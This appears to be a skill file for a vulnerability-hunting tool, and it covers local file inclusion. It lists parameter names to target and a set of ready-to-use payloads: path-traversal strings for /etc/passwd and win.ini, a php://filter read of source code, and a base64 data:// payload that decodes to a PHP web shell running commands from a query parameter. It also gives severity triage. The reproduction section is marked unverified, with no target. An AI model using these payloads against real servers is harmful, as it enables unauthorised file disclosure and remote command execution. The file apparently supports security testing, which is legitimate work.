---
# bughive-repro-start
cve: null
repro: unverified
# bughive-repro-end
---

# SKILL: lfi
## Params
file, view, download, page, cat, dir, action, board, date, detail, path, folder, prefix, include, inc, locate, show, doc, site, type, content, document, layout, mod, conf
## Payloads
/etc/passwd
../../../../etc/passwd
..\..\..\..\windows\win.ini
/etc/passwd%00.html
php://filter/convert.base64-encode/resource=index.php
/data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
## Triage
Read /etc/passwd → High. RCE via log poisoning → Critical.

<!-- bughive-repro-start -->
## Steps to reproduce

> Status: `repro: unverified` — no CVE was resolved for this skill. Nothing below was invented.

### What's missing
- no CVE/target in skill; needs teardown or stays unverified
<!-- bughive-repro-end -->
